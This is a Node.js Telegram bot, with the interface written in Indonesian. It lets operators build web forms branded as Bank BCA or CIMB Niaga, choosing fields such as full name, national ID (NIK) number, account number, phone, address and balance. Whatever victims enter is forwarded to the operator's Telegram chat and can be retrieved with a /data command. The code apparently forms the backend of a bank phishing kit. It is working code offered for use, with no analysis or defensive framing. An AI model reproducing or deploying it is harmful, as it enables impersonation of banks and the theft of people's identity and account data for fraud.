const TelegramBot = require("node-telegram-bot-api");
const db = require("./db");

const TOKEN = process.env.BOT_TOKEN;
const BASE_URL = process.env.BASE_URL;
const bot = new TelegramBot(TOKEN, { polling: true });

const BANK_COLUMNS = {
  bca: {
    name: "Bank BCA",
    emoji: "🏦",
    columns: [
      { id: "nama", label: "Nama Lengkap" },
      { id: "nik", label: "NIK / No. KTP" },
      { id: "no_rekening", label: "Nomor Rekening" },
      { id: "nama_rekening", label: "Nama di Rekening" },
      { id: "no_hp", label: "Nomor HP" },
      { id: "email", label: "Email" },
      { id: "alamat", label: "Alamat" },
      { id: "kota", label: "Kota" },
      { id: "cabang", label: "Cabang BCA" },
      { id: "jenis_akun", label: "Jenis Akun" },
      { id: "saldo", label: "Saldo Awal" },
      { id: "tanggal", label: "Tanggal Pembukaan" },
    ],
  },
  cimb: {
    name: "Bank CIMB Niaga",
    emoji: "🏛️",
    columns: [
      { id: "nama", label: "Nama Lengkap" },
      { id: "nik", label: "NIK / No. KTP" },
      { id: "no_rekening", label: "Nomor Rekening" },
      { id: "nama_rekening", label: "Nama di Rekening" },
      { id: "no_hp", label: "Nomor HP" },
      { id: "email", label: "Email" },
      { id: "alamat", label: "Alamat" },
      { id: "kota", label: "Kota" },
      { id: "cabang", label: "Cabang CIMB" },
      { id: "jenis_akun", label: "Jenis Akun" },
      { id: "saldo", label: "Saldo Awal" },
      { id: "tanggal", label: "Tanggal Pembukaan" },
      { id: "swift", label: "Kode SWIFT" },
    ],
  },
};

const userSessions = {};

function getSession(userId) {
  if (!userSessions[userId]) {
    userSessions[userId] = {
      step: "idle",
      bank: null,
      selectedColumns: [],
      page: 1,
      chatId: null,
    };
  }
  return userSessions[userId];
}

function resetSession(userId) {
  userSessions[userId] = {
    step: "idle",
    bank: null,
    selectedColumns: [],
    page: 1,
    chatId: null,
  };
}

function generateFormId() {
  return Math.random().toString(36).substring(2, 10).toUpperCase();
}

function bankSelectionKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "🏦 Bank BCA", callback_data: "bank_bca" },
        { text: "🏛️ CIMB Niaga", callback_data: "bank_cimb" },
      ],
    ],
  };
}

function columnSelectionKeyboard(bankKey, selectedColumns, page = 1) {
  const bank = BANK_COLUMNS[bankKey];
  const ITEMS_PER_PAGE = 6;
  const totalPages = Math.ceil(bank.columns.length / ITEMS_PER_PAGE);
  const startIdx = (page - 1) * ITEMS_PER_PAGE;
  const pageColumns = bank.columns.slice(startIdx, startIdx + ITEMS_PER_PAGE);
  const rows = [];

  for (let i = 0; i < pageColumns.length; i += 2) {
    const row = [];
    for (let j = i; j < Math.min(i + 2, pageColumns.length); j++) {
      const col = pageColumns[j];
      const isSelected = selectedColumns.includes(col.id);
      row.push({
        text: `${isSelected ? "✅" : "⬜"} ${col.label}`,
        callback_data: `col_${col.id}`,
      });
    }
    rows.push(row);
  }

  const navRow = [];
  if (page > 1) navRow.push({ text: "◀️ Sebelumnya", callback_data: `page_${page - 1}` });
  if (page < totalPages) navRow.push({ text: "Berikutnya ▶️", callback_data: `page_${page + 1}` });
  if (navRow.length) rows.push(navRow);

  const actionRow = [];
  if (selectedColumns.length >= 1) {
    actionRow.push({ text: "💾 Simpan & Buat Link", callback_data: "save_columns" });
  }
  actionRow.push({ text: "➡️ Halaman Berikutnya", callback_data: "next_page_form" });
  rows.push(actionRow);

  rows.push([
    { text: "🔄 Reset Pilihan", callback_data: "reset_columns" },
    { text: "🔙 Ganti Bank", callback_data: "change_bank" },
  ]);

  return { inline_keyboard: rows };
}

function page2Keyboard() {
  return {
    inline_keyboard: [
      [{ text: "🔗 Buat Link Form Sekarang", callback_data: "generate_link" }],
      [{ text: "✏️ Edit Kolom", callback_data: "edit_columns" }],
      [{ text: "🏠 Mulai Ulang", callback_data: "restart" }],
    ],
  };
}

function summaryMessage(session) {
  const bank = BANK_COLUMNS[session.bank];
  const selectedLabels = session.selectedColumns.map((id) => {
    const col = bank.columns.find((c) => c.id === id);
    return col ? `• ${col.label}` : `• ${id}`;
  });
  return (
    `📋 *RINGKASAN FORM*\n\n` +
    `${bank.emoji} *Bank:* ${bank.name}\n` +
    `📌 *Kolom Dipilih (${session.selectedColumns.length}):*\n` +
    selectedLabels.join("\n") +
    `\n\n_Tekan Buat Link untuk generate link form._`
  );
}

// Notifikasi saat ada yang submit form
async function notifySubmission(formId, bank, data) {
  try {
    const bankInfo = BANK_COLUMNS[bank];
    const entries = Object.entries(data)
      .map(([k, v]) => {
        const col = bankInfo?.columns.find((c) => c.id === k);
        return `• ${col ? col.label : k}: ${v}`;
      })
      .join("\n");

    // Kirim ke semua session yang punya formId ini
    for (const [userId, session] of Object.entries(userSessions)) {
      if (session.chatId) {
        await bot.sendMessage(
          session.chatId,
          `📬 *Form Baru Terisi!*\n\n` +
          `🔑 Form ID: \`${formId}\`\n` +
          `${bankInfo?.emoji} Bank: ${bankInfo?.name}\n\n` +
          `📝 *Data:*\n${entries}`,
          { parse_mode: "Markdown" }
        );
      }
    }
  } catch (err) {
    console.error("Notif error:", err);
  }
}

bot.onText(/\/start/, (msg) => {
  const userId = msg.from.id;
  resetSession(userId);
  getSession(userId).chatId = msg.chat.id;
  bot.sendMessage(
    msg.chat.id,
    `👋 *Selamat datang di Form Link Generator!*\n\nPilih bank untuk mulai:`,
    { parse_mode: "Markdown", reply_markup: bankSelectionKeyboard() }
  );
});

bot.onText(/\/buat/, (msg) => {
  const userId = msg.from.id;
  resetSession(userId);
  getSession(userId).chatId = msg.chat.id;
  bot.sendMessage(msg.chat.id, `🏦 *Pilih Bank:*`, {
    parse_mode: "Markdown",
    reply_markup: bankSelectionKeyboard(),
  });
});

bot.onText(/\/data (.+)/, async (msg, match) => {
  const formId = match[1].trim().toUpperCase();
  try {
    const submissions = await db.getSubmissions(formId);
    if (submissions.length === 0) {
      return bot.sendMessage(msg.chat.id, `📭 Belum ada data untuk form \`${formId}\``, {
        parse_mode: "Markdown",
      });
    }
    let text = `📊 *Data Form ${formId}*\nTotal: ${submissions.length} entri\n\n`;
    submissions.slice(0, 5).forEach((s, i) => {
      text += `*${i + 1}.* ${new Date(s.submitted_at).toLocaleString("id-ID")}\n`;
      Object.entries(s.data).forEach(([k, v]) => {
        text += `  • ${k}: ${v}\n`;
      });
      text += "\n";
    });
    bot.sendMessage(msg.chat.id, text, { parse_mode: "Markdown" });
  } catch (err) {
    bot.sendMessage(msg.chat.id, "❌ Gagal ambil data.");
  }
});

bot.on("callback_query", async (query) => {
  const userId = query.from.id;
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;
  const session = getSession(userId);
  session.chatId = chatId;

  await bot.answerCallbackQuery(query.id);

  if (data.startsWith("bank_")) {
    const bankKey = data.replace("bank_", "");
    session.bank = bankKey;
    session.selectedColumns = [];
    session.step = "selecting_columns";
    session.page = 1;
    const bank = BANK_COLUMNS[bankKey];
    await bot.editMessageText(
      `${bank.emoji} *${bank.name}*\n\nPilih minimal 1 kolom:\nTerpilih: *${session.selectedColumns.length}*`,
      { chat_id: chatId, message_id: messageId, parse_mode: "Markdown",
        reply_markup: columnSelectionKeyboard(bankKey, session.selectedColumns, 1) }
    );
    return;
  }

  if (data.startsWith("col_")) {
    const colId = data.replace("col_", "");
    const idx = session.selectedColumns.indexOf(colId);
    if (idx === -1) session.selectedColumns.push(colId);
    else session.selectedColumns.splice(idx, 1);
    const bank = BANK_COLUMNS[session.bank];
    await bot.editMessageText(
      `${bank.emoji} *${bank.name}*\n\nPilih minimal 1 kolom:\nTerpilih: *${session.selectedColumns.length}*`,
      { chat_id: chatId, message_id: messageId, parse_mode: "Markdown",
        reply_markup: columnSelectionKeyboard(session.bank, session.selectedColumns, session.page) }
    );
    return;
  }

  if (data.startsWith("page_")) {
    session.page = parseInt(data.replace("page_", ""));
    const bank = BANK_COLUMNS[session.bank];
    await bot.editMessageText(
      `${bank.emoji} *${bank.name}*\n\nTerpilih: *${session.selectedColumns.length}*`,
      { chat_id: chatId, message_id: messageId, parse_mode: "Markdown",
        reply_markup: columnSelectionKeyboard(session.bank, session.selectedColumns, session.page) }
    );
    return;
  }

  if (data === "reset_columns") {
    session.selectedColumns = [];
    const bank = BANK_COLUMNS[session.bank];
    await bot.editMessageText(
      `${bank.emoji} *${bank.name}*\n\n🔄 Direset. Terpilih: *0*`,
      { chat_id: chatId, message_id: messageId, parse_mode: "Markdown",
        reply_markup: columnSelectionKeyboard(session.bank, session.selectedColumns, 1) }
    );
    return;
  }

  if (data === "change_bank") {
    session.bank = null;
    session.selectedColumns = [];
    session.step = "idle";
    await bot.editMessageText(`🏦 *Pilih Bank:*`,
      { chat_id: chatId, message_id: messageId, parse_mode: "Markdown",
        reply_markup: bankSelectionKeyboard() }
    );
    return;
  }

  if (data === "save_columns" || data === "generate_link") {
    if (session.selectedColumns.length === 0) return;
    const formId = generateFormId();
    await db.saveForm(formId, session.bank, session.selectedColumns);
    const link = `${BASE_URL}/form/${formId}`;
    const bank = BANK_COLUMNS[session.bank];
    await bot.editMessageText(
      `✅ *Link Form Berhasil Dibuat!*\n\n` +
      `${bank.emoji} *Bank:* ${bank.name}\n` +
      `📋 *Kolom:* ${session.selectedColumns.length}\n\n` +
      `🔗 *Link Form:*\n${link}\n\n` +
      `📊 Lihat data: /data ${formId}`,
      { chat_id: chatId, message_id: messageId, parse_mode: "Markdown",
        reply_markup: { inline_keyboard: [
          [{ text: "🆕 Buat Form Baru", callback_data: "restart" }],
        ]}}
    );
    return;
  }

  if (data === "next_page_form") {
    if (session.selectedColumns.length === 0) return;
    session.step = "preview";
    await bot.editMessageText(summaryMessage(session),
      { chat_id: chatId, message_id: messageId, parse_mode: "Markdown",
        reply_markup: page2Keyboard() }
    );
    return;
  }

  if (data === "edit_columns") {
    session.step = "selecting_columns";
    session.page = 1;
    const bank = BANK_COLUMNS[session.bank];
    await bot.editMessageText(
      `${bank.emoji} *${bank.name}*\n\nEdit kolom. Terpilih: *${session.selectedColumns.length}*`,
      { chat_id: chatId, message_id: messageId, parse_mode: "Markdown",
        reply_markup: columnSelectionKeyboard(session.bank, session.selectedColumns, 1) }
    );
    return;
  }

  if (data === "restart") {
    resetSession(userId);
    await bot.editMessageText(`🏦 *Pilih Bank:*`,
      { chat_id: chatId, message_id: messageId, parse_mode: "Markdown",
        reply_markup: bankSelectionKeyboard() }
    );
    return;
  }
});

bot.on("message", (msg) => {
  if (msg.text && !msg.text.startsWith("/")) {
    bot.sendMessage(msg.chat.id,
      `💡 Perintah:\n/start - Mulai\n/buat - Buat form baru\n/data [ID] - Lihat data form`
    );
  }
});

module.exports = { notifySubmission };
console.log("🤖 Bot aktif...");
